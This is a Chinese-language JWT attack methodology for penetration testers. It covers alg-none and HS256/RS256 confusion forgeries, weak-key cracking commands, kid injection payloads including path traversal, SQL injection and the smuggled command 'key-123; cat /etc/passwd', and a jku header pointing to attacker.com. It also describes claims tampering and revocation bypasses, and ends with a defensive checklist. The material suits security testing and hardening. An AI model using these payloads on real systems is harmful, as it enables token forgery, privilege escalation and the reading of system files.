# **JWT 认证攻击方法论**

---

# **第一部分：文档概述**

## 1.1 编写目的
- 为测试人员提供系统化的 JWT 认证机制测试与攻击方法
- 帮助识别 JWT 实现中的加密缺陷、配置错误和逻辑漏洞
- 提高 JWT 相关认证漏洞的发现和利用效率

## 1.2 适用范围
- 适用于使用 JSON Web Token (JWT) 进行身份认证的各类系统
- 包括 Web 应用、REST API、微服务架构、移动应用后端
- 常见于单点登录 (SSO)、OAuth 2.0、OIDC 等认证场景

## 1.3 读者对象
- 渗透测试工程师、安全分析师
- API 安全测试人员
- 负责 JWT 认证实现的安全开发人员

---

# **第二部分：核心渗透技术专题**

## 专题：JWT 认证攻击

## 2.1 技术介绍
- **漏洞原理：** JWT 认证攻击是指针对 JSON Web Token 的生成、验证、存储和使用过程中的安全缺陷进行利用，从而获得未授权访问或权限提升。
- **本质：** JWT 的签名验证、算法协商、密钥管理或 claims 验证存在缺陷，导致攻击者能够伪造、篡改或重放 Token。

| **攻击类型** | **描述** | **常见原因** |
| :--- | :--- | :--- |
| **算法混淆攻击** | 修改算法为 none 或使用弱算法 | 服务端未强制验证算法 |
| **密钥爆破攻击** | 暴力破解 JWT 签名密钥 | 使用弱密钥或默认密钥 |
| **签名绕过攻击** | 绕过签名验证逻辑 | 验证代码存在逻辑缺陷 |
| **Token 重放攻击** | 重用已失效或已吊销的 Token | 未实施 Token 吊销机制 |
| **Claims 篡改攻击** | 修改 Token 中的权限声明 | 未验证关键 claims |
| **JWKS 注入攻击** | 注入恶意 JWKS 密钥集 | 未验证 JWKS 来源 |

## 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户登录** | 登录后返回 JWT Token | Token 签名验证不当 |
| **API 认证** | API 请求携带 JWT 进行认证 | Token 校验逻辑缺陷 |
| **微服务通信** | 服务间使用 JWT 传递身份 | 服务间信任机制薄弱 |
| **单点登录** | SSO 系统颁发 JWT | 跨域 Token 验证问题 |
| **权限管理** | JWT 中包含角色/权限 claims | Claims 未签名或可篡改 |
| **第三方集成** | OAuth/OIDC 使用 JWT | 第三方 Token 验证不严 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

- **Token 收集与分析**
  - 从 Cookie、LocalStorage、响应头收集 JWT
  - 使用 jwt.io 或类似工具解码分析结构
  - 识别 header 中的算法、kid、jku 等参数
  - 分析 payload 中的 claims 结构和敏感信息

- **算法混淆测试**
  ```
  # 原始 Token
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  
  # 修改算法为 none
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
  
  # 修改算法为 HS256（当原为 RS256 时）
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  ```

- **签名测试**
  - 修改 payload 后测试原签名是否仍有效
  - 尝试删除签名部分（第三个点之后）
  - 尝试使用空签名

- **敏感信息检测**
  - 检查 payload 中是否包含明文密码、PII
  - 检查是否泄露内部系统信息
  - 检查权限 claims 是否可被修改

### 2.3.2 白盒测试

- **代码审计要点**
  - 搜索 JWT 验证相关代码
  - 检查算法验证逻辑（是否接受 none）
  - 查看密钥管理方式（硬编码、弱密钥）
  - 检查 claims 验证是否完整

- **关键代码模式**
  ```python
  # 危险模式：未验证算法
  decoded = jwt.decode(token, verify=False)
  
  # 危险模式：接受任意算法
  decoded = jwt.decode(token, algorithms=None)
  
  # 危险模式：硬编码弱密钥
  secret = "secret123"
  decoded = jwt.decode(token, secret, algorithms=['HS256'])
  ```

## 2.4 漏洞利用方法

### 2.4.1 算法混淆攻击 (Algorithm Confusion)

- **None 算法攻击**
  ```
  # 步骤 1: 解码原始 Token
  Header: {"alg":"RS256","typ":"JWT"}
  Payload: {"user":"victim","role":"user"}
  
  # 步骤 2: 修改 Header
  Header: {"alg":"none","typ":"JWT"}
  
  # 步骤 3: 修改 Payload 提升权限
  Payload: {"user":"admin","role":"admin"}
  
  # 步骤 4: 删除签名部分
  伪造 Token: base64(header).base64(payload).
  ```

- **HS256/RS256 混淆攻击**
  ```
  # 当服务端使用 RS256（非对称）但接受 HS256（对称）时
  
  # 步骤 1: 获取公钥（通常公开）
  public_key = get_public_key()
  
  # 步骤 2: 修改 Header 为 HS256
  Header: {"alg":"HS256","typ":"JWT"}
  
  # 步骤 3: 使用公钥作为 HS256 密钥签名
  forged_token = jwt.encode(payload, public_key, algorithm='HS256')
  ```

### 2.4.2 密钥爆破攻击

- **常见弱密钥字典**
  ```
  secret
  password
  123456
  jwt_secret
  your-256-bit-secret
  your-secret-key
  changeme
  admin
  ```

- **爆破工具使用**
  ```bash
  # 使用 jwtcrack
  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  
  # 使用 hashcat (提取 JWT hash)
  hashcat -m 16500 jwt.txt wordlist.txt
  
  # 使用 John the Ripper
  john --format=HMAC-SHA256 jwt.txt
  ```

### 2.4.3 Key ID (kid) 注入攻击

- **路径遍历注入**
  ```
  # 原始 Header
  {"alg":"HS256","typ":"JWT","kid":"key-123"}
  
  # 注入路径遍历
  {"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
  {"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}
  
  # 结果：使用空字符串或文件内容作为密钥
  ```

- **SQL 注入**
  ```
  # kid 参数存在 SQL 注入
  {"alg":"HS256","typ":"JWT","kid":"' OR '1'='1"}
  ```

- **命令注入**
  ```
  # kid 参数存在命令注入（当使用系统命令获取密钥时）
  {"alg":"HS256","typ":"JWT","kid":"key-123; cat /etc/passwd"}
  ```

### 2.4.4 JWKS/JWKS URI 攻击

- **JWKS 注入**
  ```
  # 在 Header 中注入恶意 JWKS URI
  {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/malicious-jwks.json"}
  
  # 服务端从攻击者控制的 URL 获取公钥
  # 攻击者用对应私钥签名伪造 Token
  ```

- **JWK 嵌入攻击**
  ```
  # 直接在 Header 中嵌入恶意 JWK
  {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","n":"..."}}
  ```

### 2.4.5 Token 重放攻击

- **重放场景**
  - 用户登出后 Token 仍有效
  - Token 吊销后仍可重用
  - 旧 Token 未设置过期时间

- **攻击方法**
  1. 截获有效 Token（XSS、中间人、日志泄露）
  2. 在 Token 有效期内重复使用
  3. 即使原用户修改密码或登出，Token 仍可用

### 2.4.6 Claims 篡改攻击

- **常见篡改目标**
  ```json
  // 修改用户 ID
  {"sub": "1234567890", "user_id": "1"} 
  → {"sub": "1234567890", "user_id": "2"}
  
  // 修改角色/权限
  {"role": "user", "permissions": ["read"]}
  → {"role": "admin", "permissions": ["read", "write", "delete"]}
  
  // 修改过期时间
  {"exp": 1678886400}
  → {"exp": 9999999999}
  ```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过算法白名单

- **大小写变异**
  ```
  # 某些实现未规范化算法名称
  "alg": "None"
  "alg": "NONE"
  "alg": "nOnE"
  ```

- **算法别名利用**
  ```
  # 利用算法别名
  "alg": "HMAC-SHA256"  # 代替 HS256
  "alg": "RSASSA-PKCS1-v1_5"  # 代替 RS256
  ```

### 2.5.2 绕过 Token 吊销检查

- **Token 刷新滥用**
  - 在 Token 被吊销前获取新的 refresh token
  - 利用 refresh token 生成新的 access token
  - 即使原 access token 被吊销，新 token 仍有效

- **多会话利用**
  - 同时建立多个会话获取多个 Token
  - 即使部分 Token 被吊销，其他仍可用

### 2.5.3 绕过签名验证

- **空签名测试**
  ```
  # 某些实现可能接受空签名
  Header: {"alg":"HS256","typ":"JWT"}
  Payload: {"user":"admin"}
  Signature: (空字符串)
  ```

- **签名截断**
  ```
  # 尝试使用截断的签名
  原始签名：abc123def456
  尝试：abc123、abc1、a
  ```

---

# **第三部分：附录**

## 3.1 常用 Payload 速查表

| **类别** | **Payload 示例** | **说明** |
| :--- | :--- | :--- |
| **算法攻击** | `{"alg":"none"}` | None 算法攻击 |
| **算法攻击** | `{"alg":"HS256"}` (原 RS256) | 算法混淆攻击 |
| **kid 注入** | `{"kid":"../../dev/null"}` | 路径遍历注入 |
| **kid 注入** | `{"kid":"' OR '1'='1"}` | SQL 注入 |
| **jku 注入** | `{"jku":"https://attacker.com/jwks.json"}` | JWKS URI 注入 |
| **jwk 嵌入** | `{"jwk":{"kty":"RSA",...}}` | 直接嵌入公钥 |
| **claims 篡改** | `{"role":"admin"}` | 权限提升 |
| **claims 篡改** | `{"exp":9999999999}` | 延长过期时间 |

## 3.2 JWT 安全配置检查清单

| **检查项** | **安全要求** | **测试方法** |
| :--- | :--- | :--- |
| **算法验证** | 强制使用强算法（RS256/ES256） | 尝试 none/HS256 攻击 |
| **密钥强度** | 至少 256 位随机密钥 | 尝试字典爆破 |
| **过期时间** | 设置合理的 exp（<24 小时） | 检查 Token 有效期 |
| **吊销机制** | 实现 Token 吊销列表 | 登出后验证 Token 失效 |
| **敏感信息** | 不在 payload 存储敏感数据 | 解码检查 claims |
| **签名验证** | 严格验证所有 Token 签名 | 尝试空签名/篡改 |
| **kid 处理** | 白名单验证 kid 值 | 尝试路径/SQL 注入 |
| **jku 验证** | 白名单验证 JWKS URI | 尝试注入恶意 URI |

## 3.3 常用工具

| **工具** | **用途** | **链接** |
| :--- | :--- | :--- |
| **jwt.io** | JWT 解码和在线编辑 | https://jwt.io |
| **jwt-cli** | 命令行 JWT 工具 | https://github.com/mike-engel/jwt-cli |
| **jwtcrack** | JWT 密钥爆破 | https://github.com/brendan-rius/c-jwt-cracker |
| **JOSEPH** | JWT 在线攻击平台 | https://portswigger.net/bappstore/82d6c60d4752468f841e81f6e094f3e7 |
| **TokenAnalyst** | JWT 分析 Burp 插件 | Burp Suite 扩展 |

## 3.4 参考资源

- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Security Best Practices](https://auth0.com/blog/jwt-security-best-practices/)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
